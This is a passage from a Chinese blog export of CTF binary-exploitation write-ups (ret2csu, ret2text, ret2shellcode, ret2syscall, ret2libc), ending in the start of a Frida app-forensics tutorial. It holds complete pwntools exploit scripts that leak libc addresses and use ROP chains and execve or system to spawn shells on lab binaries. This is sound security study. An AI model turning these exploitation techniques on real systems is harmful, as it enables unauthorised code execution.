0x003:0018│ 0x7fffffffe578 —▸ 0x400470 (_start) ◂— xor ebp, ebp04:0020│ 0x7fffffffe580 —▸ 0x7fffffffe680 ◂— 0x105:0028│ 0x7fffffffe588 ◂— 0x006:0030│ 0x7fffffffe590 ◂— 0x007:0038│ 0x7fffffffe598 —▸ 0x7ffff7df1040 (__libc_start_main+128) ◂— mov rdx, qword ptr [rip + 0x1c7e19]08:0040│ 0x7fffffffe5a0 ◂— 0x0 之前还想找rbp来着 后来对照了一下不同版本的ubuntu 发现确实rsp与返回地址间相差0x38个字节 12345678910111213pwndbg&gt; stack 2500:0000│ rsp 0x7fffcb531058 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)... ↓07:0038│ 0x7fffcb531090 —▸ 0x400587 (main) ◂— push rbp08:0040│ 0x7fffcb531098 ◂— 0x697d920825d30ed909:0048│ 0x7fffcb5310a0 ◂— 0x0... ↓0c:0060│ 0x7fffcb5310b8 —▸ 0x7fffcb531128 —▸ 0x7fffcb5322fb ◂— &#x27;WINDOWID=60817418&#x27;0d:0068│ 0x7fffcb5310c0 —▸ 0x7fa815fa2168 ◂— 0x00e:0070│ 0x7fffcb5310c8 —▸ 0x7fa815d8b80b (_dl_init+139) ◂— jmp 0x7fa815d8b7e00f:0078│ 0x7fffcb5310d0 ◂— 0x0... ↓11:0088│ 0x7fffcb5310e0 —▸ 0x400470 (_start) ◂— xor ebp, ebp 读者也可以这么理解 结合400616的代码发现 无论是pop还是add rsp,8 都会使得rsp向高地址移动8个字节 那么总共有7个如此的操作rsp总共会向高地址移动7*8&#x3D;56个字节 之后才会ret 那么我们覆盖栈地址也就需要0x38个字节(我们用的是read函数 所以读入时覆盖的是栈空间 但是待400616函数执行时 要预留出相应的rsp移动空间) 实在不明白的话多多思考 低版本EXP12345678910111213141516171819202122232425262728293031from pwn import *sh = process(&#x27;./1&#x27;)elf = ELF(&#x27;./1&#x27;)context.log_level = &#x27;debug&#x27;csu1 = 0x40061Acsu2 = 0x400600write_got = elf.got[&#x27;write&#x27;]libc_start_main_got = elf.got[&#x27;__libc_start_main&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]def csu(rbx,rbp,r12,r13,r14,r15,ret): payload = &#x27;a&#x27; * 136 payload += p64(csu1) payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu2) payload += &#x27;a&#x27; * 0x38 payload += p64(main_addr) sh.sendline(payload)sh.recvuntil(&#x27;Hello, World\\\\n&#x27;)csu(0,1,write_got,8,libc_start_main_got,1,main_addr)libc_start_main_addr = u64(sh.recv(6).ljust(8,&#x27;\\\\0&#x27;))print hex(libc_start_main_addr)[DEBUG] Received 0x15 bytes: 00000000 c0 3f 0a e3 c3 7f 00 00 48 65 6c 6c 6f 2c 20 57 │·?··│····│Hell│o, W│ 00000010 6f 72 6c 64 0a │orld│·│ 000000150x7fc3e30a3fc0 成功获取libc_start_main地址 剩下的使用libc寻找system和shell的方法就不赘述了 这里重点讲一下使用execve的 1234567#read(0,bss_base,16)csu(0,1,read_got,32,bss_base,0,main_addr)sh.send(p64(execve_addr) + &#x27;/bin/sh\\\\x00&#x27;)sh.recvuntil(&#x27;Hello, World\\\\n&#x27;)csu(0,1,bss_base,0,0,bss_base+8,main_addr)sh.interactive() 这里和SROP不太一样的地方在于 这里是单纯的将execve函数地址以及&#x2F;bin&#x2F;sh\\x00字符串写入bss段中 并且很暴力的构造栈空间 将返回地址指向execve_addr 让bss_base+8成为参数 不过在高版本的ubuntu中这样并不行 因为稍高版本的ubuntu的bss段就没有执行权限了 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *from LibcSearcher import *sh = process(&#x27;./1&#x27;)elf = ELF(&#x27;./1&#x27;)context.log_level = &#x27;debug&#x27;csu1 = 0x000000000040061Acsu2 = 0x0000000000400600bss_base = elf.bss()write_got = elf.got[&#x27;write&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]read_got = elf.got[&#x27;read&#x27;]def csu(rbx,rbp,r12,r13,r14,r15,ret): payload = &#x27;a&#x27; * 136 payload += p64(csu1) payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu2) payload += &#x27;a&#x27; * 0x38 payload += p64(main_addr) sh.send(payload)sh.recvuntil(&#x27;Hello, World\\\\n&#x27;)# write(1,write_got,8)csu(0,1,write_got,8,write_got,1,main_addr)write_addr = u64(sh.recv(8))libc = LibcSearcher(&#x27;write&#x27;,write_addr)libc_base = write_addr - libc.dump(&#x27;write&#x27;)execve_addr = libc_base + libc.dump(&#x27;execve&#x27;)log.success(&#x27;execve_addr &#x27; + hex(execve_addr))sh.recvuntil(&#x27;Hello, World\\\\n&#x27;)#read(0,bss_base,32)csu(0,1,read_got,32,bss_base,0,main_addr)sh.sendline(p64(execve_addr) + &#x27;/bin/sh\\\\x00&#x27;)sh.recvuntil(&#x27;Hello, World\\\\n&#x27;)csu(0,1,bss_base,0,0,bss_base+8,main_addr)sh.interactive() 最后注意一下binsh那块的sendline 我试了一下p64(execve_addr) + ‘&#x2F;bin&#x2F;sh\\x00’加起来刚好16个字节 如果用sendline的话后面还会补一个0x0a 那么会read那边字节数要改成32字节 不然会超 对于高版本而言 可能该EXP会失效 还是用老办法或者带一个mprotect的函数修改bss段权限 12345678[DEBUG] Sent 0x10 bytes: 00000000 f0 17 dd 4e 66 7f 00 00 2f 62 69 6e 2f 73 68 00 │···N│f···│/bin│/sh·│ 00000010[DEBUG] Sent 0x11 bytes: 00000000 f0 27 63 30 41 7f 00 00 2f 62 69 6e 2f 73 68 00 │·&#x27;c0│A···│/bin│/sh·│ 00000010 0a │·│ 00000011","categories":[{"name":"Stack/Medium","slug":"Stack-Medium","permalink":"https://dawoxiansigema.github.io/categories/Stack-Medium/"}],"tags":[]},{"title":"CTFwiki基础栈溢出","slug":"CTFwiki基础栈溢出","date":"2023-10-31T13:28:02.000Z","updated":"2023-10-31T13:42:49.943Z","comments":true,"path":"2023/10/31/CTFwiki基础栈溢出/","link":"","permalink":"https://dawoxiansigema.github.io/2023/10/31/CTFwiki%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"ctfwiki基础栈溢出部分题解","text":"ctfwiki基础栈溢出部分题解 ret2text我们在IDA中反编译该文件 并查看main函数 得到的C代码如下 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s[100]; // [esp+1Ch] [ebp-64h] BYREF setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;There is something amazing here, do you know anything?&quot;); gets(s); printf(&quot;Maybe I will tell you next time !&quot;); return 0;&#125; 我们看到了gets函数 一个非常常见的栈溢出点 若是从IDA的分析来看 栈结构应该是这样的 1234567891011121314 +-----------------+ | retaddr | +-----------------+ | saved ebp | ebp---&gt;+-----------------+ | | | | | | | | | | | |s,ebp-0x64--&gt;+-----------------+ | |esp,s-0x1c--&gt;|-----------------| 后面在查看secure函数的时候 我们看到了调用系统函数system的地方 注意那边的&#x2F;bin&#x2F;sh 他的地址是0x0804863A 12345678910111213141516171819202122232425262728293031.text:080485FD public secure.text:080485FD secure proc near.text:080485FD.text:080485FD input = dword ptr -10h.text:080485FD secretcode = dword ptr -0Ch.text:080485FD.text:080485FD ; __unwind &#123;.text:080485FD push ebp.text:080485FE mov ebp, esp.text:08048600 sub esp, 28h.text:08048603 mov dword ptr [esp], 0 ; timer.text:0804860A call _time.text:0804860F mov [esp], eax ; seed.text:08048612 call _srand.text:08048617 call _rand.text:0804861C mov [ebp+secretcode], eax.text:0804861F lea eax, [ebp+input].text:08048622 mov [esp+4], eax.text:08048626 mov dword ptr [esp], offset unk_8048760.text:0804862D call ___isoc99_scanf.text:08048632 mov eax, [ebp+input].text:08048635 cmp eax, [ebp+secretcode].text:08048638 jnz short locret_8048646.text:0804863A mov dword ptr [esp], offset command ; &quot;/bin/sh&quot;.text:08048641 call _system.text:08048646.text:08048646 locret_8048646: ; CODE XREF: secure+3B↑j.text:08048646 leave.text:08048647 retn.text:08048647 ; &#125; // starts at 80485FD.text:08048647 secure endp 那么我们可以流程化的写个exp出来 12345from pwn import *sh = process(&#x27;./ret2text&#x27;)success_addr = 0x804863ash.sendline(&#x27;a&#x27;*(0x64+4)+p32(success_addr))sh.interactive() 但是结果就是打不通 和wp上不一样的地方是s距离ebp的地址并不是64 而是6c 1sh.sendline(&#x27;a&#x27;*(0x6c+4)+p32(success_addr)) 更改payload之后执行并拿到系统bash 不过为什么呢 分析原因也只能是IDA上分析的栈结构错误 我们使用gdb的pwndbg进行动调 在此之前我们先使用cyclic获取一段长为200的字符串 然后输入 123456789101112131415161718192021$ gdb -q ./ret2textpwndbg: loaded 192 commands. Type pwndbg [filter] for a list.pwndbg: created $rebase, $ida gdb functions (can be used with print/break)Reading symbols from ./ret2text...done.pwndbg&gt; rStarting program: /home/harvey/Desktop/Pwn/CTFwiki/Basic ROP/ret2text/ret2textThere is something amazing here, do you know anything?aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA─────────────────────────────────[ REGISTERS ]────────────────────────────────── EAX 0x0 EBX 0x0 ECX 0x21 EDX 0xf7fb8890 (_IO_stdfile_1_lock) ◂— 0x0 EDI 0x0 ESI 0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c EBP 0x62616163 (&#x27;caab&#x27;) ESP 0xffffcec0 ◂— &#x27;eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#x27; EIP 0x62616164 (&#x27;daab&#x27;)───────────────────────────────────[ DISASM ]───────────────────────────────────Invalid address 0x62616164 程序在这个时候出现了溢出 程序想要返回0x62616164值中的地址时无法返回于是报错 而这个地址正是我们需要利用的地址 我们只需要知道在这个地址之前填充了多少字符即可 12pwndbg&gt; cyclic -l 0x62616164112 //6c+4---&gt;112 当然 为了验证到底是6c还是64直接去观察栈结构即可 具体的肯定是在输入字符时的 123456789101112131415161718192021222324252627282930313233343500:0000│ esp 0xffffd660 —▸ 0xffffd67c ◂— &#x27;dawoxiansigema&#x27;01:0004│ 0xffffd664 ◂— 0x002:0008│ 0xffffd668 ◂— 0x103:000c│ 0xffffd66c ◂— 0x0... ↓ 2 skipped06:0018│ 0xffffd678 —▸ 0xf7ffd000 ◂— 0x2bf2407:001c│ eax 0xffffd67c ◂— &#x27;dawoxiansigema&#x27;08:0020│ 0xffffd680 ◂— &#x27;xiansigema&#x27;09:0024│ 0xffffd684 ◂— &#x27;sigema&#x27;0a:0028│ edx-2 0xffffd688 ◂— 0x616d /* &#x27;ma&#x27; */0b:002c│ 0xffffd68c —▸ 0xf7fbb224 (__elf_set___libc_subfreeres_element_free_mem__) —▸ 0xf7f44850 (free_mem) ◂— endbr32 0c:0030│ 0xffffd690 ◂— 0x00d:0034│ 0xffffd694 —▸ 0xf7fbd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c0e:0038│ 0xffffd698 —▸ 0xf7ffc7e0 (_rtld_global_ro) ◂— 0x00f:003c│ 0xffffd69c —▸ 0xf7fc04e8 (__exit_funcs_lock) ◂— 0x010:0040│ 0xffffd6a0 —▸ 0xf7fbd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c11:0044│ 0xffffd6a4 —▸ 0xf7fe22f0 ◂— endbr32 12:0048│ 0xffffd6a8 ◂— 0x013:004c│ 0xffffd6ac —▸ 0x8048425 (_init+9) ◂— add ebx, 0x1bdb14:0050│ 0xffffd6b0 —▸ 0xf7fbd3fc (__exit_funcs) —▸ 0xf7fbe180 (initial) ◂— 0x015:0054│ 0xffffd6b4 ◂— 0x4000016:0058│ 0xffffd6b8 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f14 (_DYNAMIC) ◂— 0x117:005c│ 0xffffd6bc —▸ 0x8048722 (__libc_csu_init+82) ◂— add edi, 118:0060│ 0xffffd6c0 ◂— 0x119:0064│ 0xffffd6c4 —▸ 0xffffd784 —▸ 0xffffd8a1 ◂— &#x27;/ctf/work/ret2text&#x27;1a:0068│ 0xffffd6c8 —▸ 0xffffd78c —▸ 0xffffd8b4 ◂— &#x27;LESSOPEN=| /usr/bin/lesspipe %s&#x27;1b:006c│ 0xffffd6cc —▸ 0xf7e06479 (__cxa_atexit+41) ◂— add esp, 0x1c1c:0070│ 0xffffd6d0 —▸ 0xf7fe22f0 ◂— endbr32 1d:0074│ 0xffffd6d4 ◂— 0x01e:0078│ 0xffffd6d8 —▸ 0x80486db (__libc_csu_init+11) ◂— add ebx, 0x19251f:007c│ 0xffffd6dc ◂— 0x020:0080│ 0xffffd6e0 —▸ 0xf7fbd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c21:0084│ 0xffffd6e4 —▸ 0xf7fbd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c22:0088│ ebp 0xffffd6e8 ◂— 0x023:008c│ 0xffffd6ec —▸ 0xf7decee5 (__libc_start_main+245) ◂— add esp, 0x10 6e8-67c&#x3D;6c 所以这里证明了确实是 最终修改wp 成功拿到本机的shell ret2shellcode先用checksec看一下情况如何 1234567[*] &#x27;/Users/apple/Desktop/ret2shellcode&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 好在NX是关闭的 也没有开启金丝雀 数据段还有可以利用的可能 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No system for you this time !!!&quot;); gets(&amp;s); strncpy(buf2, &amp;s, 0x64u); printf(&quot;bye bye ~&quot;); return 0;&#125; 在ida静态分析中 很明显没有可以利用的现成system函数了 我们如果需要提权需要我们自己构造 我们看到了gets函数 很高危 除此之外就只有strncpy函数或许可以被利用了 跟进一步 看看buf2参数是否可以利用 strncpy函数本身是系统定义的 无需查看 1234.bss:0804A080 ; char buf2[100].bss:0804A080 buf2 db 64h dup(?) ; DATA XREF: main+7B↑o.bss:0804A080 _bss ends.bss:0804A080 我们可以看到所在段是bss段 据说这段的数据有存在命令执行的可能 进入后尝试vmmap 123456789101112131415161718192021pwndbg&gt; vmmap 0x8048000 0x8049000 r-xp 1000 0 /ctf/work/ret2shellcode 0x8049000 0x804a000 r--p 1000 0 /ctf/work/ret2shellcode 0x804a000 0x804b000 rw-p 1000 1000 /ctf/work/ret2shellcode 0x804b000 0x806d000 rw-p 22000 0 [heap]0xf7dd2000 0xf7deb000 r--p 19000 0 /usr/lib/i386-linux-gnu/libc-2.31.so0xf7deb000 0xf7f46000 r-xp 15b000 19000 /usr/lib/i386-linux-gnu/libc-2.31.so0xf7f46000 0xf7fba000 r--p 74000 174000 /usr/lib/i386-linux-gnu/libc-2.31.so0xf7fba000 0xf7fbb000 ---p 1000 1e8000 /usr/lib/i386-linux-gnu/libc-2.31.so0xf7fbb000 0xf7fbd000 r--p 2000 1e8000 /usr/lib/i386-linux-gnu/libc-2.31.so0xf7fbd000 0xf7fbe000 rw-p 1000 1ea000 /usr/lib/i386-linux-gnu/libc-2.31.so0xf7fbe000 0xf7fc1000 rw-p 3000 0 [anon_f7fbe]0xf7fc9000 0xf7fcb000 rw-p 2000 0 [anon_f7fc9]0xf7fcb000 0xf7fcf000 r--p 4000 0 [vvar]0xf7fcf000 0xf7fd1000 r-xp 2000 0 [vdso]0xf7fd1000 0xf7fd2000 r--p 1000 0 /usr/lib/i386-linux-gnu/ld-2.31.so0xf7fd2000 0xf7ff0000 r-xp 1e000 1000 /usr/lib/i386-linux-gnu/ld-2.31.so0xf7ff0000 0xf7ffb000 r--p b000 1f000 /usr/lib/i386-linux-gnu/ld-2.31.so0xf7ffc000 0xf7ffd000 r--p 1000 2a000 /usr/lib/i386-linux-gnu/ld-2.31.so0xf7ffd000 0xf7ffe000 rw-p 1000 2b000 /usr/lib/i386-linux-gnu/ld-2.31.so0xfffdd000 0xffffe000 rwxp 21000 0 [stack] 然而除了最后一个stack以外 没有任何一个有rwx权限 这好像和ctfwiki上面写的不太一样 后来查过资料 linux内核5.0以上 bss段就默认没有可执行权限了 由于我的pwndocker内核&gt;5.0了 于是此题只能作罢 123456from pwn import *sh = process(&#x27;./ret2shellcode&#x27;)shellcode = asm(shellcraft.sh())buf2_addr = 0x0804a000sh.sendline = (shellcode.ljust(112,&#x27;a&#x27;)+p32(buf2_addr))sh.interactive() （虽然打不通 不过倒是发现了vscode+pwndocker+hyperpwn的绝妙组合）不过这种情况肯定会遇到 总是有解决办法的捏 具体可以看我写的get_started_3dsctf_2016这题 ret2syscall1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;); puts(&quot;What do you plan to do?&quot;); gets(&amp;v4); return 0;&#125; checksec情况还是一样就开了个NX 看到这回情况是在ret2shellcode上升级而来的 去除了shellcode的可能性 尝试利用系统调用 我们的思路是利用execve函数 此题是getshell 如果是openflag的话可以去这个网站 1&lt;https://syscalls32.paolostivanin.com&gt; #将32改为64可以查看64位情况 利用系统调用来调用函数和利用返回地址调用函数略微有不同 利用返回地址调用主要是覆盖返回地址 引导EIP跳转执行地址 而利用系统调用则是要覆盖寄存器 对于execve函数而言 12345execve(&quot;/bin/sh&quot;,NULL,NULL)EAX ---&gt; 0xbEBX ---&gt; /bin/shECX ---&gt; 0x0EDX ---&gt; 0x0 在系统调用之前 必须将四个寄存器设置为上述情况 然后进行系统调用就会调用execve了 当然上述情况都是利用ROPgadget搜寻程序内包含相应字符串地址进行的 1ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27; 弹出栈顶至eax寄存器 当然可以一个一个进行操作 如果没有单个寄存器操作的也可以包含几个一起的 12ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 然后寻找系统中断以及&#x2F;bin&#x2F;sh字符串相对应的函数地址 对于栈结构的构造原理不多说 可以查看我写的GET_STARTED_3DSCTF_2016题解 123456789ROPgadget --binary rop --string &#x27;/bin/sh&#x27; Strings information============================================================0x080be408 : /bin/shROPgadget --binary rop --only &#x27;int&#x27; Gadgets information============================================================0x08049421 : int 0x80 EXP如下 成功执行shel 1234567891011121314151617181920from pwn import *sh = process(&#x27;./rop&#x27;)#context.log_level = &#x27;debug&#x27;pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90bin_sh_addr = 0x080be408int_80_addr = 0x08049421padding = 112payload = padding * &#x27;a&#x27;payload += p32(pop_eax_ret)payload += p32(0xb)payload += p32(pop_edx_ecx_ebx_ret)payload += p32(0x0)payload += p32(0x0)payload += p32(bin_sh_addr)payload += p32(int_80_addr)sh.sendline(payload)sh.interactive() 当然肯定存在搜不到&#x2F;bin&#x2F;sh的情况 那我们可以自己输入他 同样利用系统调用 调用read函数进行输入 1read(0,buf_addr,10) #具体寄存器情况查看之前那个网站 不再赘述 只不过read函数需要利用bss段写入 此时是不需要bss段权限的 因为我们自带执行函数 相当于这次我们只是写个字符串进去 上次ret2shellcode是写个可以交互的shell 1234567891011121314151617181920212223242526272829303132from pwn import *import timesh = process(&#x27;./rop&#x27;)context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./rop&#x27;)pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_80_addr = 0x0806f230buf = elf.bss() payload = 112 * &#x27;a&#x27;payload += p32(pop_eax_ret)payload += p32(0x3)payload += p32(pop_edx_ecx_ebx_ret)payload += p32(0x10)payload += p32(buf)payload += p32(0x0)payload += p32(int_80_addr)payload += p32(pop_eax_ret)payload += p32(0xb)payload += p32(pop_edx_ecx_ebx_ret)payload += p32(0x0)payload += p32(0x0)payload += p32(buf)payload += p32(int_80_addr)sh.sendline(payload)sleep(1)sh.send(&#x27;/bin/sh\\\\x00&#x27;)sleep(1)sh.interactive() 不同的是 对于多个系统中断时 不能用一般的int 0x80 得用这个地址 1234$ ROPgadget --binary rop --opcode cd80c3Opcodes information============================================================0x0806f230 : cd80c3 ret2libc2大部分内容比较常规 主要是了解plt动态链接的情况 12345678910111213141516171819202122from pwn import *import time context.log_level = &#x27;debug&#x27;sh = process(&#x27;./ret2libc2&#x27;)gets_plt_addr = 0x08048460system_plt_addr = 0x08048490buf = 0x804a050pop_addr = 0x0804843dpayload = 112 * &#x27;a&#x27;payload += p32(gets_plt_addr)payload += p32(pop_addr)payload += p32(buf)payload += p32(system_plt_addr)payload += &#x27;bbbb&#x27;payload += p32(buf)sh.sendline(payload)sleep(1)sh.sendline(&#x27;/bin/sh\\\\x00&#x27;)sh.interactive() 注意buf地址 原本想使用elf.bss() 后来发现一开始的段落并没有写入权限 1234pwndbg&gt; vmmap 0x8048000 0x8049000 r-xp 1000 0 /ctf/work/ret2libc2 0x8049000 0x804a000 r--p 1000 0 /ctf/work/ret2libc2 0x804a000 0x804b000 rw-p 1000 1000 /ctf/work/ret2libc2 所以buf地址从0x804a000开始取 也别从边界加一点点就可以 在此题中动态链接这个知识点体现的不够突出 和静态链接情况差不多 ret2libc3（出libc泄漏不给libc的都是老流氓）调了一整天了 就是不通 已经放弃了的时候 尝试更新了一下libc-database 在更新了俩小时之后 终于通了 wp都不想写了 注意几点 1231.关于延迟绑定 泄漏函数起点的选择必须是当前输入函数之前已经执行过的2.__libc_start_main.got是plt重定向时需要调用的 可以视为参数3.libc中每个函数相对基址 以及函数间地址偏移都是固定的 所以可以现有地址-libc的offset=libc的基址 核心的思路就是利用puts函数将got表打印出来 由于动态链接puts函数只有plt表 那么就需要在前期puts被调用过 还有就是plt表存储的是指令 got表存储的是指令地址 而我们的返回地址必须存储的是指令 因此不能直接使用got表 这题还有一个很有意思的_start函数 12345678910111213141516171819.text:080484D0.text:080484D0 public _start.text:080484D0 _start proc near ; DATA XREF: LOAD:08048018↑o.text:080484D0 xor ebp, ebp.text:080484D2 pop esi.text:080484D3 mov ecx, esp.text:080484D5 and esp, 0FFFFFFF0h.text:080484D8 push eax.text:080484D9 push esp ; stack_end.text:080484DA push edx ; rtld_fini.text:080484DB push offset __libc_csu_fini ; fini.text:080484E0 push offset __libc_csu_init ; init.text:080484E5 push ecx ; ubp_av.text:080484E6 push esi ; argc.text:080484E7 push offset main ; main.text:080484EC call ___libc_start_main.text:080484F1 hlt.text:080484F1 _start endp.text:080484F1 _start函数是对于计算机而言的入口 main函数是对用户而言的 _start其中有一行是对esp进行and操作 从而堆栈平衡 所以我们第二次直接返回main函数的话 栈就会多&#x2F;少几个字符 去验证这一点是比较麻烦的 所以干脆第二次返回到_start函数即可 那你要是不正常返回可能报错数据无法正常输出哦 12345678910111213141516171819202122232425#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchersh = process(&#x27;ret2libc3&#x27;)ret2libc3 = ELF(&#x27;./ret2libc3&#x27;)puts_plt = ret2libc3.plt[&#x27;puts&#x27;]libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]#main = ret2libc3.symbols[&#x27;main&#x27;]start = ret2libc3.symbols[&#x27;_start&#x27;]payload = flat([&#x27;A&#x27; * 112, puts_plt, start, libc_start_main_got])sh.sendlineafter(&#x27;Can you find it !?&#x27;, payload)libc_start_main_addr = u32(sh.recv()[0:4])libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)payload = flat([&#x27;A&#x27; * 112, system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive() 这个pwndocker初始的glibc可能版本太高了点 导致做这几题一直崩 于是去下了个glibc-all-in-one 自己手动配置一下2.23的环境 具体download自行百度 12patchelf --set-interpreter /glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-2.23.so /ctf/work/ret2libc3patchelf --set-rpath /glibc-all-in-one/libs/2.23-0ubuntu11.3_i386 /ctf/work/ret2libc3","categories":[{"name":"Stack/Basic","slug":"Stack-Basic","permalink":"https://dawoxiansigema.github.io/categories/Stack-Basic/"}],"tags":[]},{"title":"Frida","slug":"frida","date":"2021-09-26T12:10:35.000Z","updated":"2023-10-31T13:07:54.219Z","comments":true,"path":"2021/09/26/frida/","link":"","permalink":"https://dawoxiansigema.github.io/2021/09/26/frida/","excerpt":"本文不涉及任何与案情相关内容 完全是以记录frida的综合应用为主 并且只截取了部分题目 侵删","text":"本文不涉及任何与案情相关内容 完全是以记录frida的综合应用为主 并且只截取了部分题目 侵删 5.24大比武Hook题目要我们干三件事情 1.app加密用户聊天记录的数据库文件的加密方式 2.app加密用户聊天记录的数据库文件使用的私钥字符串 3.记录用户聊天记己录的数据库表名 题目提供的镜像是vmdk格式文件 我们雷电模拟器仿真起来 很显然这个数据库被加密了(题目告诉我们的) 意味着一般的数据库取证套路都失败了 我们祭出frida frida简单来说是一个支持java和python语言的hook动态调试框架 我们首先要先让模拟器跑起来这个框架 1adb push D:\\Work\\网安十百千\\frida环境\\frida-server-15.0.13-android-x86\\frida /data/local/tmp 传输成功之后 还要赋予他777 1chmod 777 frida 进入root之后 在tmp目录下执行该文件 1./frida 这个框架目前就运行在了模拟器上 接下来回到咱电脑 模拟器那边的框架建立好了 我们需要在本机上运行frida.exe 建立连接 个人因为环境原因 将frida.exe 放在了python3&#x2F;script里 进去之后 1./frida.exe --version 出现版本则代表frida版本暂时没问题 接下来可以进行hook 一个通用脚本是进行hook看看他在运行的时候读取了哪些文件 这样说不定可以找到他的数据库文件 hook_open_files.js 1234567891011121314Java.perform(function () &#123; var openPtr = Module.findExportByName(&quot;libc.so&quot;, &quot;open&quot;); send(&quot;操作文件: &quot; + openPtr); Interceptor.attach(openPtr, &#123; onEnter: function(args) &#123; var path = Memory.readUtf8String(args[0]); if (path.search(&quot;data&quot;) != -1) &#123; send(&quot;路径:&quot; + path); &#125; &#125;, onLeave:function(retval) &#123; &#125;&#125;);&#125;); 基本上这个脚本不用改 我们给他跑起来 1./frida.exe -UF -l hook_open_files.js 注意 -UF的意思是hook当前正在运行的程序 所以我们事先得先把程序跑起来 然后再执行脚本 而且注意 这个.js脚本得和frida.exe放在一个文件夹里 我的环境是这样 12345message: &#123;&#x27;type&#x27;: &#x27;send&#x27;, &#x27;payload&#x27;: &#x27;路径:/data/data/cn.keke.chat/cache/w9wIwIoo.session&#x27;&#125; data: Nonemessage: &#123;&#x27;type&#x27;: &#x27;send&#x27;, &#x27;payload&#x27;: &#x27;路径:/data/data/cn.keke.chat/cache/MXMXMXKK.session&#x27;&#125; data: Nonemessage: &#123;&#x27;type&#x27;: &#x27;send&#x27;, &#x27;payload&#x27;: &#x27;路径:/data/data/cn.keke.chat/cache/w0wJwJpp.session&#x27;&#125; data: Nonemessage: &#123;&#x27;type&#x27;: &#x27;send&#x27;, &#x27;payload&#x27;: &#x27;路径:/data/misc/profiles/cur/0/cn.keke.chat/primary.prof&#x27;&#125; data: Nonemessage: &#123;&#x27;type&#x27;: &#x27;send&#x27;, &#x27;payload&#x27;: &#x27;路径:/data/data/cn.keke.chat/cache/CLClClXX.session&#x27;&#125; data: None 我们虽然读取到了他读取的文件 但是我们发现这都是.session文件 如果我们去看一眼也会发现 这个.session是没有加密的 他只是将文本按一定格式进行了储存 那就不对了 说明很可能这个程序有多个进程 目前我们看到的聊天的这个进程他是没有读取数据库的 我们还需要另一个进程的数据 这个时候就需要多进程hook了 由于这个脚本是python的 所以我们需要开放一下27042端口才行 27042是默认的通信端口 1adb forward tcp:27042 tcp:27042 打开了之后 我们在进行hook 我们用hook_thread_open_file.py 用的时候需要改一下包名 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495# -*- coding: utf-8 -*-import codecsimport fridaimport sysimport threading#device = frida.get_remote_device()device = frida.get_device_manager().enumerate_devices()[-1]#print(device)pending = []sessions = []scripts = []event = threading.Event()jscode = &quot;&quot;&quot;Java.perform(function () &#123; var openPtr = Module.findExportByName(&quot;libc.so&quot;, &quot;open&quot;); send(&quot;操作文件: &quot; + openPtr); Interceptor.attach(openPtr, &#123; onEnter: function(args) &#123; var path = Memory.readUtf8String(args[0]); if (path.search(&quot;data&quot;) != -1) &#123; send(&quot;路径:&quot; + path); // send(Thread.backtrace(this.context, Backtracer.ACCURATE)); var module = Process.findModuleByAddress(this.returnAddress); var name = module.name; send(&quot;加载文件: &quot; + name); &#125; &#125;, onLeave:function(retval) &#123; &#125;&#125;);&#125;);&quot;&quot;&quot;def on_spawned(spawn): print(&#x27;on_spawned:&#x27;, spawn) pending.append(spawn) event.set()def spawn_added(spawn): print(&#x27;spawn_added:&#x27;, spawn) event.set() if(spawn.identifier.startswith(&#x27;cn.keke.chat&#x27;)): # if(spawn.identifier.startswith(&#x27;cn.keke.chat&#x27;)): session = device.attach(spawn.pid) script = session.create_script(jscode) script.on(&#x27;message&#x27;, on_message) script.load() device.resume(spawn.pid) def spawn_removed(spawn): 